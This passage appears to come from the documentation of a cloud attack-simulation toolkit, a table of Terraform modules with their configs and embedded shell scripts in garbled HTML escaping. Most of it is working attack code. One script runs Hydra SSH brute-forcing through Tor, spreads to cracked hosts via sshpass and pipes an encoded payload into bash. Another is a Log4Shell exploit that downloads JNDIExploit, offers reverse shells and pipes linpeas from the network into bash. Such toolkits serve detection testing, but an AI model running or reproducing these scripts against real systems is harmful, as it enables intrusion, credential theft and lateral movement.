yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;<br/>            &&#35;123;<br/>                name = &quot;$&&#35;123;basename&&#35;40;abspath&&#35;40;path&#46;module&&#35;41;&&#35;41;&&#35;125;&&#35;95;auto&#45;free&#46;sh&quot;<br/>                content = base64encode&&#35;40;local&#46;auto&#45;free&&#35;41;<br/>            &&#35;125;,<br/>            &&#35;123;<br/>                name = &quot;$&&#35;123;basename&&#35;40;abspath&&#35;40;path&#46;module&&#35;41;&&#35;41;&&#35;125;&&#35;95;auto&#45;paid&#46;sh&quot;<br/>                content = base64encode&&#35;40;local&#46;auto&#45;paid&&#35;41;<br/>            &&#35;125;,<br/>            &&#35;123;<br/>                name = &quot;$&&#35;123;basename&&#35;40;abspath&&#35;40;path&#46;module&&#35;41;&&#35;41;&&#35;125;&&#35;95;baseline&#46;sh&quot;<br/>                content = base64encode&&#35;40;local&#46;baseline&&#35;41;<br/>            &&#35;125;,<br/>            &&#35;123;<br/>                name = &quot;$&&#35;123;basename&&#35;40;abspath&&#35;40;path&#46;module&&#35;41;&&#35;41;&&#35;125;&&#35;95;discovery&#46;sh&quot;<br/>                content = base64encode&&#35;40;local&#46;discovery&&#35;41;<br/>            &&#35;125;,<br/>            &&#35;123;<br/>                name = &quot;$&&#35;123;basename&&#35;40;abspath&&#35;40;path&#46;module&&#35;41;&&#35;41;&&#35;125;&&#35;95;evasion&#46;sh&quot;<br/>                content = base64encode&&#35;40;local&#46;evasion&&#35;41;<br/>            &&#35;125;,<br/>            &&#35;123;<br/>                name = &quot;$&&#35;123;basename&&#35;40;abspath&&#35;40;path&#46;module&&#35;41;&&#35;41;&&#35;125;&&#35;95;cloudransom&#46;sh&quot;<br/>                content = base64encode&&#35;40;local&#46;cloudransom&&#35;41;<br/>            &&#35;125;,<br/>            &&#35;123;<br/>                name = &quot;$&&#35;123;basename&&#35;40;abspath&&#35;40;path&#46;module&&#35;41;&&#35;41;&&#35;125;&&#35;95;terraform&#46;sh&quot;<br/>                content = base64encode&&#35;40;local&#46;terraform&&#35;41;<br/>            &&#35;125;,<br/>            &&#35;123;<br/>                name = &quot;$&&#35;123;basename&&#35;40;abspath&&#35;40;path&#46;module&&#35;41;&&#35;41;&&#35;125;&&#35;95;start&#46;sh&quot;<br/>                content = base64encode&&#35;40;local&#46;start&&#35;41;<br/>            &&#35;125;<br/>        &&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                       |
| attacker-ssm-execute-docker-hydra                                          | ./modules/ssm/execute-docker-hydra                             | ssm_exec_docker_hydra_attacker             | context.aws.ssm.attacker.execute.docker_hydra                             | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "attacker": {<br/>                    "execute": {<br/>                        "docker_hydra": {<br/>                            "attack_delay": 50400,<br/>                            "custom_password_list": [],<br/>                            "custom_user_list": [],<br/>                            "enabled": false,<br/>                            "password_list": "/opt/passwords/darkweb2017-top10.txt",<br/>                            "scan_local_network": false,<br/>                            "targets": [],<br/>                            "use_tor": true,<br/>                            "user_list": "/opt/usernames/top-usernames-shortlist.txt"<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-docker-hydra                             | <pre>locals &&#35;123;<br/>    attack&&#35;95;dir = &quot;/hydra&quot;<br/>    targets = flatten&&#35;40;&&#35;91; for target in var&#46;inputs&&#35;91;&quot;targets&quot;&&#35;93;: can&&#35;40;split&&#35;40;&quot;/&quot;, target&&#35;41;&&#35;91;1&&#35;93;&&#35;41; ? <br/>        &&#35;91; for host&&#35;95;number in range&&#35;40;pow&&#35;40;2, 32 &#45; split&&#35;40;&quot;/&quot;, target&&#35;41;&&#35;91;1&&#35;93;&&#35;41;&&#35;41; : cidrhost&&#35;40;target, host&&#35;95;number&&#35;41; &&#35;93;<br/>        :<br/>        &&#35;91; target &&#35;93;<br/>    &&#35;93;&&#35;41;<br/>    base64&&#35;95;command&&#35;95;payload = var&#46;inputs&&#35;91;&quot;payload&quot;&&#35;93;<br/>    payload = &lt;&lt;&#45;EOT<br/>    &#35; Function to convert IP address to decimal<br/>    ip&&#35;95;to&&#35;95;dec&&#35;40;&&#35;41; &&#35;123;<br/>        local IFS=&#46;<br/>        read ip1 ip2 ip3 ip4 &lt;&lt;&lt; &quot;$1&quot;<br/>        echo &quot;$&&#35;40;&&#35;40;ip1 &&#35;42; 16777216 &#43; ip2 &&#35;42; 65536 &#43; ip3 &&#35;42; 256 &#43; ip4&&#35;41;&&#35;41;&quot;<br/>    &&#35;125;<br/><br/>    &#35; Function to convert decimal to IP address<br/>    dec&&#35;95;to&&#35;95;ip&&#35;40;&&#35;41; &&#35;123;<br/>        local ip dec=$1<br/>        for e in &&#35;123;3&#46;&#46;0&&#35;125;; do<br/>            &&#35;40;&&#35;40;octet = dec / &&#35;40;256 &&#35;42;&&#35;42; e&&#35;41; &&#35;41;&&#35;41;<br/>            &&#35;40;&&#35;40;dec &#45;= octet &&#35;42; 256 &&#35;42;&&#35;42; e&&#35;41;&&#35;41;<br/>            ip&#43;=&quot;$$&&#35;123;octet&&#35;125;&#46;&quot;<br/>        done<br/>        echo &quot;$$&&#35;123;ip%?&&#35;125;&quot;<br/>    &&#35;125;<br/><br/>    &#35; Main function to generate IP list from CIDR<br/>    generate&&#35;95;ips&&#35;40;&&#35;41; &&#35;123;<br/>        local cidr=&quot;$1&quot;<br/>        local ip=&quot;$$&&#35;123;cidr%/&&#35;42;&&#35;125;&quot;<br/>        local prefix=&quot;$$&&#35;123;cidr&#35;&&#35;42;/&&#35;125;&quot;<br/>        local netmask=$&&#35;40;&&#35;40;0xffffffff ^ &&#35;40;&&#35;40;1 &lt;&lt; &&#35;40;32 &#45; prefix&&#35;41;&&#35;41; &#45; 1&&#35;41;&&#35;41;&&#35;41;<br/><br/>        local start=$&&#35;40;ip&&#35;95;to&&#35;95;dec &quot;$ip&quot;&&#35;41;<br/>        local start=$&&#35;40;&&#35;40;start &amp; netmask&&#35;41;&&#35;41;<br/>        local end=$&&#35;40;&&#35;40;start &#124; &&#35;40;&&#35;40;1 &lt;&lt; &&#35;40;32 &#45; prefix&&#35;41;&&#35;41; &#45; 1&&#35;41;&&#35;41;&&#35;41;<br/><br/>        for &&#35;40;&&#35;40;ip= start; ip &lt;= end; ip&#43;&#43;&&#35;41;&&#35;41;; do<br/>            dec&&#35;95;to&&#35;95;ip &quot;$ip&quot;<br/>        done<br/>    &&#35;125;<br/><br/>    log &quot;cleaning app directory&quot;<br/>    rm &#45;rf $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>    mkdir &#45;p $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>    cd $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>    START&&#35;95;HASH=$&&#35;40;sha256sum &#45;&#45;text /tmp/payload&&#35;95;$SCRIPTNAME &#124; awk &&#35;x27;&&#35;123; print $1 &&#35;125;&&#35;x27;&&#35;41;<br/>    while true; do<br/>        log &quot;starting script&#46;&#46;&#46;&quot;<br/>        LOCAL&&#35;95;NET=$&&#35;40;ip &#45;o &#45;f inet addr show &#124; awk &&#35;x27;/scope global/ &&#35;123;print $4&&#35;125;&&#35;x27; &#124; head &#45;1&&#35;41;<br/>        log &quot;LOCAL&&#35;95;NET: $LOCAL&&#35;95;NET&quot;<br/>        log &quot;Targets: $&&#35;123;join&&#35;40;&quot;,&quot;, local&#46;targets&&#35;41;&&#35;125;&quot;<br/>        echo &quot;$&&#35;123; length&&#35;40;local&#46;targets&&#35;41; &gt; 0 ? join&&#35;40;&quot;&&#35;92;n&quot;, local&#46;targets&&#35;41; : &quot;$&&#35;40;generate&&#35;95;ips $LOCAL&&#35;95;NET&&#35;41;&quot; &&#35;125;&quot; &gt; /tmp/hydra&#45;targets&#46;txt<br/>        cat &gt; /tmp/hydra&#45;users&#46;txt &lt;&lt;&&#35;x27;EOF&&#35;x27;<br/>    $&&#35;123;try&&#35;40;length&&#35;40;var&#46;inputs&&#35;91;&quot;ssh&&#35;95;user&quot;&&#35;93;&#46;username&&#35;41;,&quot;false&quot;&&#35;41; &#33;= &quot;false&quot; ? var&#46;inputs&&#35;91;&quot;ssh&&#35;95;user&quot;&&#35;93;&#46;username : &quot;root&quot; &&#35;125;<br/>    EOF<br/>        cat &gt; /tmp/hydra&#45;passwords&#46;txt &lt;&lt;&&#35;x27;EOF&&#35;x27;<br/>    123456<br/>    123456789<br/>    111111<br/>    password<br/>    qwerty<br/>    abc123<br/>    12345678<br/>    password1<br/>    1234567<br/>    123123<br/>    $&&#35;123;try&&#35;40;length&&#35;40;var&#46;inputs&&#35;91;&quot;ssh&&#35;95;user&quot;&&#35;93;&#46;password&&#35;41;,&quot;false&quot;&&#35;41; &#33;= &quot;false&quot; ? var&#46;inputs&&#35;91;&quot;ssh&&#35;95;user&quot;&&#35;93;&#46;password : &quot;&quot; &&#35;125;<br/>    EOF<br/>        if sudo docker ps &#45;a &#124; grep $&&#35;123;var&#46;inputs&&#35;91;&quot;container&&#35;95;name&quot;&&#35;93;&&#35;125;; then <br/>        sudo docker stop $&&#35;123;var&#46;inputs&&#35;91;&quot;container&&#35;95;name&quot;&&#35;93;&&#35;125;<br/>        sudo docker rm $&&#35;123;var&#46;inputs&&#35;91;&quot;container&&#35;95;name&quot;&&#35;93;&&#35;125;<br/>        fi<br/>        truncate &#45;s 0 /tmp/hydra&#45;found&#46;txt<br/>        $&&#35;123; var&#46;inputs&&#35;91;&quot;use&&#35;95;tor&quot;&&#35;93; == true ? &lt;&lt;&#45;EOF<br/>        log &quot;Using tor network&#46;&#46;&#46;&quot;<br/>        if &#33; docker ps &#124; grep torproxy &gt; /dev/null; then<br/>        sudo docker run &#45;d &#45;&#45;rm &#45;&#45;name torproxy &#45;p 9050:9050 dperson/torproxy<br/>        fi<br/>        TORPROXY=$&&#35;40;docker inspect &#45;f &&#35;x27;&&#35;123;&&#35;123;range &#46;NetworkSettings&#46;Networks&&#35;125;&&#35;125;&&#35;123;&&#35;123;&#46;IPAddress&&#35;125;&&#35;125;&&#35;123;&&#35;123;end&&#35;125;&&#35;125;&&#35;x27; torproxy&&#35;41;<br/>        log &quot;Running: proxychains hydra &#45;V &#45;L $&&#35;123;var&#46;inputs&&#35;91;&quot;user&&#35;95;list&quot;&&#35;93;&&#35;125; &#45;P $&&#35;123;var&#46;inputs&&#35;91;&quot;password&&#35;95;list&quot;&&#35;93;&&#35;125; &#45;M /tmp/hydra&#45;targets&#46;txt &#45;dvV &#45;t 4 &#45;u &#45;w 10 ssh&quot;<br/>        sudo /bin/bash &#45;c &quot;docker run &#45;v /tmp:/tmp &#45;e TORPROXY=$TORPROXY &#45;&#45;name $&&#35;123;var&#46;inputs&&#35;91;&quot;container&&#35;95;name&quot;&&#35;93;&&#35;125; $&&#35;123;var&#46;inputs&&#35;91;&quot;image&quot;&&#35;93;&&#35;125; hydra &#45;V &#45;L $&&#35;123;var&#46;inputs&&#35;91;&quot;user&&#35;95;list&quot;&&#35;93;&&#35;125; &#45;P $&&#35;123;var&#46;inputs&&#35;91;&quot;password&&#35;95;list&quot;&&#35;93;&&#35;125; &#45;o /tmp/hydra&#45;found&#46;txt &#45;M /tmp/hydra&#45;targets&#46;txt &#45;dvV &#45;t 4 &#45;u &#45;w 10 ssh &#124;&#124; true&quot;<br/>        sudo /bin/bash &#45;c &quot;docker logs $&&#35;123;var&#46;inputs&&#35;91;&quot;container&&#35;95;name&quot;&&#35;93;&&#35;125; &gt;&gt; $LOGFILE 2&gt;&amp;1&quot;<br/>        sudo /bin/bash &#45;c &quot;docker rm $&&#35;123;var&#46;inputs&&#35;91;&quot;container&&#35;95;name&quot;&&#35;93;&&#35;125;&quot;<br/>        log &quot;Running: proxychains hydra &#45;V &#45;L /tmp/hydra&#45;users&#46;txt &#45;P /tmp/hydra&#45;passwords&#46;txt &#45;M /tmp/hydra&#45;targets&#46;txt &#45;dvV &#45;t 4 &#45;u &#45;w 10 ssh&quot;<br/>        sudo /bin/bash &#45;c &quot;docker run &#45;v /tmp:/tmp &#45;e TORPROXY=$TORPROXY &#45;&#45;name $&&#35;123;var&#46;inputs&&#35;91;&quot;container&&#35;95;name&quot;&&#35;93;&&#35;125; $&&#35;123;var&#46;inputs&&#35;91;&quot;image&quot;&&#35;93;&&#35;125; hydra &#45;V &#45;L /tmp/hydra&#45;users&#46;txt &#45;P /tmp/hydra&#45;passwords&#46;txt &#45;o /tmp/hydra&#45;found&#46;txt &#45;M /tmp/hydra&#45;targets&#46;txt &#45;dvV &#45;t 4 &#45;u &#45;w 10 ssh &#124;&#124; true&quot;<br/>        sudo /bin/bash &#45;c &quot;docker logs $&&#35;123;var&#46;inputs&&#35;91;&quot;container&&#35;95;name&quot;&&#35;93;&&#35;125; &gt;&gt; $LOGFILE 2&gt;&amp;1&quot;<br/>        sudo /bin/bash &#45;c &quot;docker rm $&&#35;123;var&#46;inputs&&#35;91;&quot;container&&#35;95;name&quot;&&#35;93;&&#35;125;&quot;<br/>        EOF<br/>        : &lt;&lt;&#45;EOF<br/>        log &quot;Running: hydra &#45;V &#45;L $&&#35;123;var&#46;inputs&&#35;91;&quot;user&&#35;95;list&quot;&&#35;93;&&#35;125; &#45;P $&&#35;123;var&#46;inputs&&#35;91;&quot;password&&#35;95;list&quot;&&#35;93;&&#35;125; &#45;M /tmp/hydra&#45;targets&#46;txt &#45;dvV &#45;t 4 &#45;u &#45;w 10 ssh&quot;<br/>        sudo /bin/bash &#45;c &quot;docker run &#45;v /tmp:/tmp &#45;&#45;entrypoint=hydra &#45;&#45;name $&&#35;123;var&#46;inputs&&#35;91;&quot;container&&#35;95;name&quot;&&#35;93;&&#35;125; $&&#35;123;var&#46;inputs&&#35;91;&quot;image&quot;&&#35;93;&&#35;125; &#45;V &#45;L $&&#35;123;var&#46;inputs&&#35;91;&quot;user&&#35;95;list&quot;&&#35;93;&&#35;125; &#45;P $&&#35;123;var&#46;inputs&&#35;91;&quot;password&&#35;95;list&quot;&&#35;93;&&#35;125; &#45;o /tmp/hydra&#45;found&#46;txt &#45;M /tmp/hydra&#45;targets&#46;txt &#45;dvV &#45;t 4 &#45;u &#45;w 10 ssh &#124;&#124; true&quot;<br/>        sudo /bin/bash &#45;c &quot;docker logs $&&#35;123;var&#46;inputs&&#35;91;&quot;container&&#35;95;name&quot;&&#35;93;&&#35;125; &gt;&gt; $LOGFILE 2&gt;&amp;1&quot;<br/>        sudo /bin/bash &#45;c &quot;docker rm $&&#35;123;var&#46;inputs&&#35;91;&quot;container&&#35;95;name&quot;&&#35;93;&&#35;125;&quot;<br/>        log &quot;Running: hydra &#45;V &#45;L /tmp/hydra&#45;users&#46;txt &#45;P /tmp/hydra&#45;passwords&#46;txt &#45;M /tmp/hydra&#45;targets&#46;txt &#45;dvV &#45;t 4 &#45;u &#45;w 10 ssh&quot;<br/>        sudo /bin/bash &#45;c &quot;docker run &#45;v /tmp:/tmp &#45;&#45;entrypoint=hydra &#45;&#45;name $&&#35;123;var&#46;inputs&&#35;91;&quot;container&&#35;95;name&quot;&&#35;93;&&#35;125; $&&#35;123;var&#46;inputs&&#35;91;&quot;image&quot;&&#35;93;&&#35;125; &#45;V &#45;L /tmp/hydra&#45;users&#46;txt &#45;P /tmp/hydra&#45;passwords&#46;txt &#45;o /tmp/hydra&#45;found&#46;txt &#45;M /tmp/hydra&#45;targets&#46;txt &#45;dvV &#45;t 4 &#45;u &#45;w 10 ssh &#124;&#124; true&quot;<br/>        sudo /bin/bash &#45;c &quot;docker logs $&&#35;123;var&#46;inputs&&#35;91;&quot;container&&#35;95;name&quot;&&#35;93;&&#35;125; &gt;&gt; $LOGFILE 2&gt;&amp;1&quot;<br/>        sudo /bin/bash &#45;c &quot;docker rm $&&#35;123;var&#46;inputs&&#35;91;&quot;container&&#35;95;name&quot;&&#35;93;&&#35;125;&quot;<br/>        EOF<br/>        &&#35;125;<br/>        &#35; Read Hydra output file line by line<br/>        while IFS= read &#45;r line; do<br/>            &#35; Parse Hydra output<br/>            host=$&&#35;40;echo &quot;$line&quot; &#124; awk &&#35;x27;&&#35;123;print $3&&#35;125;&&#35;x27;&&#35;41;<br/>            username=$&&#35;40;echo &quot;$line&quot; &#124; awk &&#35;x27;&&#35;123;print $5&&#35;125;&&#35;x27;&&#35;41;<br/>            password=$&&#35;40;echo &quot;$line&quot; &#124; awk &&#35;x27;&&#35;123;print $7&&#35;125;&&#35;x27;&&#35;41;<br/>            log &quot;Attempting to execute payload: sshpass &#45;p &&#35;92;&quot;$password&&#35;92;&quot; ssh &#45;o StrictHostKeyChecking=no &&#35;92;&quot;$username&&#35;92;&quot;@&&#35;92;&quot;$host&&#35;92;&quot; &&#35;x27;echo $&&#35;123;base64gzip&&#35;40;local&#46;base64&&#35;95;command&&#35;95;payload&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &#124; /bin/bash&quot;<br/>            sshpass &#45;p &quot;$password&quot; ssh &#45;o StrictHostKeyChecking=no &quot;$username&quot;@&quot;$host&quot; &&#35;x27;echo $&&#35;123;base64gzip&&#35;40;local&#46;base64&&#35;95;command&&#35;95;payload&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &#124; /bin/bash&&#35;x27;<br/>            log &quot;Done&quot;<br/>        done &lt; &lt;&&#35;40;grep &#45;v &quot;^&#35;&quot; /tmp/hydra&#45;found&#46;txt &#124; sort &#124; uniq&&#35;41;<br/>        log &quot;Done&#46;&quot;<br/><br/>        log &&#35;x27;waiting 30 minutes&#46;&#46;&#46;&&#35;x27;;<br/>        sleep 1800<br/>        if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>            log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>            rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&#46;&#46;&#46;&quot;<br/>            log &quot;waiting $&&#35;123;var&#46;inputs&&#35;91;&quot;attack&&#35;95;delay&quot;&&#35;93;&&#35;125; seconds&#46;&#46;&#46;&quot;;<br/>            sleep $&&#35;123;var&#46;inputs&&#35;91;&quot;attack&&#35;95;delay&quot;&&#35;93;&&#35;125;<br/>        fi<br/>    done<br/>    log &quot;Done&#46;&quot;<br/>    EOT<br/><br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &lt;&lt;&#45;EOT<br/>        log &quot;Checking for docker&#46;&#46;&#46;&quot;<br/>        while &#33; command &#45;v docker &gt; /dev/null &#124;&#124; &#33; docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready &#45; waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $&&#35;40;command &#45;v  docker&&#35;41;&quot;<br/>        EOT<br/>        apt&&#35;95;packages = &quot;sshpass jq&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &lt;&lt;&#45;EOT<br/>        log &quot;Checking for docker&#46;&#46;&#46;&quot;<br/>        while &#33; command &#45;v docker &gt; /dev/null &#124;&#124; &#33; docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready &#45; waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $&&#35;40;command &#45;v  docker&&#35;41;&quot;<br/>        EOT<br/>        yum&&#35;95;packages = &quot;sshpass jq&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = var&#46;inputs&&#35;91;&quot;attack&&#35;95;delay&quot;&&#35;93;<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| attacker-ssm-execute-docker-exploit-log4j                                  | ./modules/ssm/execute-docker-exploit-log4j                     | ssm_exec_docker_exploit_log4j_app          | context.aws.ssm.attacker.execute.docker_exploit_log4j_app                 | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "attacker": {<br/>                    "execute": {<br/>                        "docker_exploit_log4j_app": {<br/>                            "attack_delay": 50400,<br/>                            "attacker_http_port": 8088,<br/>                            "attacker_ip": null,<br/>                            "attacker_ldap_port": 1389,<br/>                            "enabled": false,<br/>                            "payload": "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files",<br/>                            "reverse_shell": false,<br/>                            "reverse_shell_port": 0,<br/>                            "target_ip": null,<br/>                            "target_port": null<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-docker-exploit-log4j                     | <pre>locals &&#35;123;<br/>    attack&&#35;95;dir = &quot;/jndiexploit&quot;<br/>    attack&&#35;95;script = &quot;jndiexploit&#46;sh&quot;<br/>    start&&#35;95;script = &quot;delayed&&#35;95;start&#46;sh&quot;<br/>    lock&&#35;95;file = &quot;/tmp/delay&&#35;95;log4shell&#46;lock&quot;<br/>    jndiexploit&&#35;95;url=&quot;https://github&#46;com/credibleforce/jndi/raw/main/jndi&#46;base64&quot;<br/>    image = &quot;openjdk:11&quot;<br/>    name = &quot;jndiexploit&quot;<br/>    exec&&#35;95;type = var&#46;inputs&&#35;91;&quot;reverse&&#35;95;shell&quot;&&#35;93; == true ? &quot;ReverseShell&quot; : &quot;Basic/Command/Base64&quot;<br/><br/>    &#35; only base64 encode the payload if we are executing a command<br/>    base64&&#35;95;log4shell&&#35;95;payload= urlencode&&#35;40;var&#46;inputs&&#35;91;&quot;reverse&&#35;95;shell&quot;&&#35;93; == true ? var&#46;inputs&&#35;91;&quot;payload&quot;&&#35;93; : base64encode&&#35;40;<br/>       replace&&#35;40;replace&&#35;40;var&#46;inputs&&#35;91;&quot;payload&quot;&&#35;93;, &quot;$ATTACKER&&#35;95;IP&quot;, var&#46;inputs&&#35;91;&quot;attacker&&#35;95;ip&quot;&&#35;93;&&#35;41;, &quot;$REVERSE&&#35;95;SHELL&&#35;95;PORT&quot;, var&#46;inputs&&#35;91;&quot;reverse&&#35;95;shell&&#35;95;port&quot;&&#35;93;&&#35;41;<br/>    &&#35;41;&&#35;41;<br/>    payload = &lt;&lt;&#45;EOT<br/>    log &quot;removing previous app directory&quot;<br/>    docker stop $&&#35;123;local&#46;name&&#35;125;<br/>    rm &#45;rf $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>    log &quot;creating app directory&quot;<br/>    mkdir &#45;p $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>    cd $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>    <br/>    log &quot;starting script&#46;&#46;&#46;&quot;<br/>    JNDIEXPLOIT&&#35;95;URL=&quot;$&&#35;123;local&#46;jndiexploit&&#35;95;url&&#35;125;&quot;<br/>    NAME=&quot;$&&#35;123;local&#46;name&&#35;125;&quot;<br/>    IMAGE=&quot;$&&#35;123;local&#46;image&&#35;125;&quot;<br/>    ATTACKER&&#35;95;IP=&quot;$&&#35;123;var&#46;inputs&&#35;91;&quot;attacker&&#35;95;ip&quot;&&#35;93;&&#35;125;&quot;<br/>    ATTACKER&&#35;95;HTTP&&#35;95;PORT=$&&#35;123;var&#46;inputs&&#35;91;&quot;attacker&&#35;95;http&&#35;95;port&quot;&&#35;93;&&#35;125;<br/>    ATTACKER&&#35;95;LDAP&&#35;95;PORT=$&&#35;123;var&#46;inputs&&#35;91;&quot;attacker&&#35;95;ldap&&#35;95;port&quot;&&#35;93;&&#35;125;<br/>    TARGET&&#35;95;IP=$&&#35;123;var&#46;inputs&&#35;91;&quot;target&&#35;95;ip&quot;&&#35;93;&&#35;125;<br/>    TARGET&&#35;95;PORT=$&&#35;123;var&#46;inputs&&#35;91;&quot;target&&#35;95;port&quot;&&#35;93;&&#35;125;<br/>    EXEC&&#35;95;TYPE=&quot;$&&#35;123;local&#46;exec&&#35;95;type&&#35;125;&quot;<br/>    REVERSE&&#35;95;SHELL&&#35;95;PORT=&quot;$&&#35;123;var&#46;inputs&&#35;91;&quot;reverse&&#35;95;shell&&#35;95;port&quot;&&#35;93;&&#35;125;&quot;<br/>    BASE64&&#35;95;PAYLOAD=&quot;$&&#35;123;local&#46;base64&&#35;95;log4shell&&#35;95;payload&&#35;125;&quot;<br/>    PUBLIC&&#35;95;IP=$&&#35;40;curl &#45;s https://icanhazip&#46;com&&#35;41;<br/>    TIMEOUT=1800<br/>    START&&#35;95;TIME=$&&#35;40;date &#43;%s&&#35;41;<br/>    &#35; Check if $ATTACKER&&#35;95;IP is an IP address<br/>    if &&#35;91;&&#35;91; $ATTACKER&&#35;95;IP =~ ^&&#35;91;0&#45;9&&#35;93;&#43;&&#35;92;&#46;&&#35;91;0&#45;9&&#35;93;&#43;&&#35;92;&#46;&&#35;91;0&#45;9&&#35;93;&#43;&&#35;92;&#46;&&#35;91;0&#45;9&&#35;93;&#43;$ &&#35;93;&&#35;93;; then<br/>        log &quot;server is set to IP address $ATTACKER&&#35;95;IP, no need to resolve DNS&quot;<br/>    else<br/>        log &quot;checking dns resolution: $ATTACKER&&#35;95;IP&quot;<br/>        while true; do<br/>            IP=$&&#35;40;dig &#43;short $ATTACKER&&#35;95;IP&&#35;41;<br/>            if &&#35;91; &#45;z &quot;$IP&quot; &&#35;93;; then  &#35; If $IP is empty, the domain hasn&&#35;x27;t resolved yet<br/>                CURRENT&&#35;95;TIME=$&&#35;40;date &#43;%s&&#35;41;<br/>                ELAPSED&&#35;95;TIME=$&&#35;40;&&#35;40;CURRENT&&#35;95;TIME &#45; START&&#35;95;TIME&&#35;41;&&#35;41;<br/>                if &&#35;91; $ELAPSED&&#35;95;TIME &#45;gt $TIMEOUT &&#35;93;; then<br/>                    log &quot;DNS resolution for $ATTACKER&&#35;95;IP timed out after $TIMEOUT seconds&quot;<br/>                    exit 1<br/>                fi<br/>                sleep 10<br/>            else<br/>                log &quot;Current public ip: $PUBLIC&&#35;95;IP&quot;<br/>                log &quot;$ATTACKER&&#35;95;IP resolved to $IP&quot;<br/>                if &&#35;91; &quot;$IP&quot; == &quot;$PUBLIC&&#35;95;IP&quot; &&#35;93;; then<br/>                    log &quot;Resolution matches public ip: $IP == $PUBLIC&&#35;95;IP&quot;<br/>                    break<br/>                else<br/>                    log &quot;Resolution of dns does not match: $IP &#33;= $PUBLIC&&#35;95;IP&quot;<br/>                    sleep 10<br/>                fi<br/>            fi<br/>        done<br/>    fi<br/><br/>    if &&#35;91;&&#35;91; &#33; &#45;f &quot;jndi&#46;base64&quot; &#124;&#124; &#33; &#45;f &quot;JNDIExploit&#45;1&#46;2&#45;SNAPSHOT&#46;jar&quot; &&#35;93;&&#35;93;; then<br/>        rm &#45;f jndi&#46;base64 &&#35;42;&#46;zip JNDIExploit&#45;&&#35;42;&#46;jar<br/>        wget https://github&#46;com/credibleforce/jndi/raw/main/jndi&#46;base64<br/>        base64 &#45;d jndi&#46;base64 &gt; JNDIExploit&#46;1&#46;2&#46;zip<br/>        unzip &#45;o JNDIExploit&#46;&&#35;42;&#46;zip<br/>        rm &&#35;42;&#46;zip<br/>    